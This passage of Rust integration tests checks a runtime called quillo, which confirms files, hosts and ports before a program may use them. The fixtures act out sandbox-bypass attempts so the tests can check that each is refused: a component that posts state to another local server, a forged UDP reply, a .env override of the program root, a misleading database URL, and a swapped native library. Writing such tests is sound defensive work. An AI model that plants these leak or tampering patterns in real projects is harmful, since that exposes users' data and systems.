    write(&d, "kit/evil.qwe", &format!("state leak = http.post(\"http://127.0.0.1:{}/state\", {{ body: \"x\" }}).status ?? null\ncomponent Badge(label) {{\n    <span>{{label}}{{leak}}</span>\n}}\n", other));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"127.0.0.1\"]\n[\"kit/evil.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/", &[], "").status, 200);
    drop(g);
    std::thread::sleep(Duration::from_millis(200));
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
}

// R2-5: a reply goes to the packet's own sender, never to an address in a map the program made;
// a port others reach is listened on only where it was confirmed (the reviewer's p3).
#[test]
fn a_udp_reply_goes_to_its_sender_alone() {
    let pick = || std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
    let (client, other) = (pick(), pick());
    client.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    other.set_read_timeout(Some(Duration::from_millis(800))).unwrap();
    let listen = { let s = pick(); s.local_addr().unwrap().port() };
    let d = temp_dir("c-r2-udp");
    write(
        &d,
        "main.qwe",
        &format!(
            "udp.listen({l}, (p) => p.text == \"forge\" ? udp.reply({{ port: {l}, from: {{ host: \"127.0.0.1\", port: {o} }} }}, \"stolen\") : udp.reply(p, \"pong\"), {{ host: \"127.0.0.1\" }})\nlet wide = udp.listen({w}, (p) => null).error ?? \"listening\"\nroute GET /w = wide\n",
            l = listen,
            o = other.local_addr().unwrap().port(),
            w = listen + 1
        ),
    );
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    client.send_to(b"ping", ("127.0.0.1", listen)).unwrap();
    let mut buf = [0u8; 64];
    let (n, _) = client.recv_from(&mut buf).unwrap();
    assert_eq!(&buf[..n], b"pong");
    client.send_to(b"forge", ("127.0.0.1", listen)).unwrap();
    assert!(other.recv_from(&mut buf).is_err(), "a forged reply arrived");
    // 0.0.0.0, others' to reach: refused, and listed for confirming.
    assert!(send(port, "GET", "/w", &[], "").body.contains("listening on udp"));
    drop(g);
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains(&format!("listens on    udp {}", listen + 1)), "{}", out);
}

// R2-6: `quillo build`, then `quillo run --no-build` on the same machine, of a confirmed plugin.
#[test]
fn quillo_build_then_run_without_building() {
    let d = temp_dir("c-r2-build");
    let _ = std::fs::remove_dir_all(record_dir(&d));
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}\", n) }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    let (code, out) = quillo_for(&d, &["build", "main.qwe"], 300);
    assert_eq!(code, Some(0), "{}", out);
    let (g, port, log) = serve(&d, &["--no-build"]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "hi Ana");
    drop(g);
    assert!(!read(&log).contains("building"), "{}", read(&log));
}

// R2-8: the program's root is the app's to pass, never .env's (the reviewer's p5).
#[test]
fn a_services_root_is_not_taken_from_env() {
    let (other, seen) = other_server();
    let d = temp_dir("c-r2-root");
    let elsewhere = temp_dir("c-r2-root-else");
    write(&elsewhere, "quillo.confirmed", &format!("[\"{}\"]\nhttp = [\"127.0.0.1\"]\n", quillo::confirm::name_from(&elsewhere, &d.join("svc/billing.qwe"))));
    write(&d, "main.qwe", "service billing = \"svc/billing.qwe\"\nroute GET / = billing.ping()\n");
    write(&d, "svc/billing.qwe", &format!("server fn ping() = str(http.get(\"http://127.0.0.1:{}/svc\").status ?? \"refused\")\n", other));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"svc/billing.qwe\"]\n");
    write(&d, ".env", &format!("QUILLO_PROGRAM_ROOT={}\n", elsewhere.display()));
    write(&d, "svc/.env", &format!("QUILLO_PROGRAM_ROOT={}\n", elsewhere.display()));
    let (g, port, _) = serve(&d, &["--split"]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "refused");
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
    let (code, out) = quillo(&d, &["run", "main.qwe", "--program-root", &elsewhere.display().to_string()]);
    assert_eq!(code, Some(2), "{}", out);
    // Started apart by hand, `--as-service`: its own folder's quillo.confirmed, not the one .env
    // names, which would let it through.
    write(&d, "svc/quillo.confirmed", "[\"billing.qwe\"]\n");
    write(&d, "svc/billing.qwe", &format!("let started = http.get(\"http://127.0.0.1:{}/svc\").status ?? \"refused\"\nroute GET / = str(started)\n", other));
    write(&elsewhere, "quillo.confirmed", &format!("[\"{}\"]\nhttp = [\"127.0.0.1\"]\n", quillo::confirm::name_from(&elsewhere, &d.join("svc/billing.qwe"))));
    let s = d.join("svc");
    let log = s.join("svc.log");
    let child = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(["run", "billing.qwe", "--port", "0", "--as-service", "--service-name", "billing"])
        .current_dir(&s)
        .env_remove("QUILLO_POLICY_PATH")
        .env("QUILLO_SECRET", "test secret for the tests, 32 bytes or more")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(std::fs::File::create(&log).unwrap())
        .spawn()
        .unwrap();
    let mut g = Guard::new(child);
    let port = port_in_log(&mut g.0, &log, Duration::from_secs(60));
    assert_eq!(send(port, "GET", "/", &[], "").body, "refused", "{}", read(&log));
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
}

// R2-9: under --watch, a file taken since the start serves none of its routes until a restart.
#[test]
fn a_file_taken_during_watch_is_not_served_until_a_restart() {
    let d = temp_dir("c-r2-watch");
    write(&d, "main.qwe", "route GET / = \"main\"\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (g, port, log) = serve(&d, &["--watch"]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "main");
    write(&d, "kit/new.qwe", "component N() { <b>n</b> }\nroute GET /new = \"new\"\n");
    write(&d, "main.qwe", "import kit/new.qwe use N\nroute GET / = \"main2\"\n");
    let until = Instant::now() + Duration::from_secs(20);
    while send(port, "GET", "/", &[], "").body != "main2" && Instant::now() < until {
        std::thread::sleep(Duration::from_millis(100));
    }
    assert_eq!(send(port, "GET", "/", &[], "").body, "main2");
    assert_eq!(send(port, "GET", "/new", &[], "").status, 404);
    drop(g);
    assert!(read(&log).contains("its file was not read as the program started"), "{}", read(&log));
}

// R2-10: the record of builds works when quillo is started from a folder that holds the cache (a
// home), and not when it lies in the program's folder.
#[test]
fn the_record_is_judged_by_the_programs_folder_not_where_quillo_starts() {
    let top = temp_dir("c-r2-cwd");
    write(&top, "app/hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n");
    write(&top, "app/main.qwe", "import hi.qwer use hi\nhi()\n");
    let record = top.join("cache");
    assert_eq!(quillo_in(&top, &record, &["confirm", "app/main.qwe", "--yes"], 60).0, Some(0));
    let (_, first) = quillo_in(&top, &record, &["run", "app/main.qwe"], 300);
    assert!(first.contains("building"), "{}", first);
    let (_, second) = quillo_in(&top, &record, &["run", "app/main.qwe"], 300);
    assert!(!second.contains("building"), "{}", second);
    // In the program's own folder, the record is the program's to write: not believed.
    let inside = top.join("app/.cache");
    let (_, a) = quillo_in(&top, &inside, &["run", "app/main.qwe"], 300);
    let (_, b) = quillo_in(&top, &inside, &["run", "app/main.qwe"], 300);
    assert!(a.contains("building") && b.contains("building"), "{}\n{}", a, b);
    assert!(!inside.join("built.txt").exists());
}

// R2-11: an `//! effects:` line counts as the only difference only in the header.
#[test]
fn an_effects_line_below_the_header_is_a_change() {
    let v1 = "//! version: 1.0.0\n//!\npub fn hi() -> String { \"hi\".into() }\n";
    let reg = format!("http://127.0.0.1:{}", catalog(v1));
    let d = temp_dir("c-r2-install");
    write(&d, "hi.qwer", &format!("{}//! effects: none\n", v1));
    let (_, out) = quillo(&d, &["install", "hi", "--registry", &reg]);
    assert!(out.contains("changed by hand"), "{}", out);
}

// R2-12: a layer's `allow` and its `catalog` are one list.
#[test]
fn a_layers_allow_and_catalog_are_one_list() {
    let d = temp_dir("c-r2-catalog");
    let hi = "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n";
    write(&d, "hi.qwer", hi);
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi()\n");
    write(&d, "catalog.json", &format!("{{\"format\":1,\"plugins\":[{{\"name\":\"hi\",\"sha256\":\"{}\"}}]}}", sha256_hex(hi.as_bytes())));
    write(&d, "p.toml", "[plugins]\nallow = [\"other\"]\ncatalog = true\n");
    assert_eq!(quillo(&d, &["check", "main.qwe", "--policy", "p.toml"]).0, Some(0));
    // Across layers each must let it in.
    write(&d, "q.toml", "[plugins]\nallow = [\"other\"]\n");
    assert_eq!(quillo(&d, &["check", "main.qwe", "--policy", "p.toml", "--policy", "q.toml"]).0, Some(1));
}

// R2-13: what reaches out at start counts UDP and databases; the page's policy is of the files
// the program takes now; image.* says a refusal as an error value.
#[test]
fn the_nits_of_review_2() {
    let d = temp_dir("c-r2-nits");
    write(&d, "main.qwe", "import kit/k.qwe use K\nroute GET / = <html><body><K/></body></html>\nroute GET /i = image.info(\"pic.png\").error ?? \"read\"\n");
    write(&d, "kit/k.qwe", "let ping = udp.send(\"10.0.0.5\", 514, \"x\")\ncomponent K() { <b>k</b> }\n");
    let (_, out) = quillo(&d, &["check", "main.qwe"]);
    assert!(out.contains("kit/k.qwe is taken for K, and also reaches out as the program starts (line 1)"), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"kit/k.qwe\"]\n[\"gone.qwe\"]\nloads = [\"old.example\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert!(!send(port, "GET", "/", &[], "").header("content-security-policy-report-only").unwrap_or_default().contains("old.example"));
    assert!(send(port, "GET", "/i", &[], "").body.contains("pic.png is not confirmed"));
    drop(g);
}

// ---- review 3 of slice C ---------------------------------------------------------------------

// R3-1: a database's hosts as its driver reads them: the user is all before the first `@`, and a
// host is percent-decoded.
#[test]
fn a_database_host_is_read_as_its_driver_reads_it() {
    assert_eq!(quillo::confirm::db_hosts("postgres://db.example.invalid/app@127.0.0.1:47977/x").unwrap(), vec!["127.0.0.1"]);
    assert_eq!(quillo::confirm::db_hosts("postgres://u@1%32%37.0.0.1:5432/db").unwrap(), vec!["127.0.0.1"]);
    assert_eq!(quillo::confirm::db_hosts("mysql://u:p@db.example:3306/app").unwrap(), vec!["db.example"]);
    let (other, seen) = other_server();
    let d = temp_dir("c-r3-dbhost");
    write(&d, "main.qwe", &format!("let d = db.open(\"postgres://db.example.invalid/app@127.0.0.1:{}/x?sslmode=disable\") ?? null\nroute GET / = \"up\"\n", other));
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains("reaches       127.0.0.1") && !out.contains("db.example.invalid"), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"db.example.invalid\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "up");
    drop(g);
    assert_eq!(seen.load(std::sync::atomic::Ordering::SeqCst), 0);
}

// R3-2: the program's own quillo.policy pinning the library it brought along does not let it load
// behind a confirmed file.
#[test]
fn the_programs_own_pin_does_not_let_its_library_load() {
    let evil = temp_dir("c-r3-evil");
    write(&evil, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"EVIL {}\", n) }\n");
    write(&evil, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    assert_eq!(quillo_for(&evil, &["build", "main.qwe"], 300).0, Some(0));
    let d = temp_dir("c-r3-pin");
    write(&d, "hi.qwer", "//! version: 1.0.0\n//! effects: none\npub fn hi(n: &str) -> String { format!(\"hi {}\", n) }\n");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi(\"Ana\")\n");
    assert_eq!(quillo_for(&d, &["build", "main.qwe"], 300).0, Some(0));
    let lib = |dir: &Path| std::fs::read_dir(dir.join(".quillo/native")).unwrap().flatten().map(|e| e.path()).find(|p| p.file_name().unwrap().to_string_lossy().contains("hi")).unwrap();
    let (good, bad) = (lib(&d), lib(&evil));
    std::fs::copy(&bad, &good).unwrap();
    let h = sha256_hex(&std::fs::read(&good).unwrap());
    write(&d, ".quillo/plugins.lock", &format!("{} {}\n", good.file_name().unwrap().to_string_lossy(), h));
    write(&d, "quillo.policy", &format!("[plugins]\nallow = [\"hi@sha256:{}\"]\n", h));
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    // Built apart from its confirmed source, whose library is not the one the program's own policy
    // pins: refused, never the one brought along.
    let (code, out) = quillo_for(&d, &["run", "main.qwe", "--port", "0"], 300);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("is not in the plugins quillo.policy allows") && !out.contains("listening"), "{}", out);
}

// R3-3: a tenant's database not confirmed makes no folder for it.
#[test]
fn a_tenant_not_confirmed_makes_no_folder() {
    let d = temp_dir("c-r3-tenant");
    write(&d, "main.qwe", "db.open(\"tenants/{tenant}/app.db\")\nroute GET / = is_err(new_tenant(\"acme\", () => 1)) ? \"refused\" : \"made\"\nroute GET /q = with_tenant(\"acme\", () => db.query(\"select 1\")).error ?? \"q\"\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert_ne!(send(port, "GET", "/", &[], "").body, "made");
    assert!(send(port, "GET", "/q", &[], "").body.contains("tenants/acme/app.db is not confirmed"));
    drop(g);
    assert!(!d.join("tenants/acme").exists());
}

// R3-4: an RTP port others reach is held as a UDP one is.
#[test]
fn an_rtp_port_others_reach_is_held() {
    let free = { let s = std::net::UdpSocket::bind("127.0.0.1:0").unwrap(); s.local_addr().unwrap().port() };
    let d = temp_dir("c-r3-rtp");
    write(&d, "main.qwe", &format!("let r = media.rtp(\"cam\", {{ video: {}, host: \"0.0.0.0\" }}).error ?? \"listening\"\nroute GET / = r\n", free));
    let (_, out) = quillo(&d, &["confirm", "--list"]);
    assert!(out.contains(&format!("listens on    udp {}", free)), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (g, port, _) = serve(&d, &[]);
    assert!(send(port, "GET", "/", &[], "").body.contains(&format!("listening on udp {} is not confirmed", free)));
    drop(g);
}
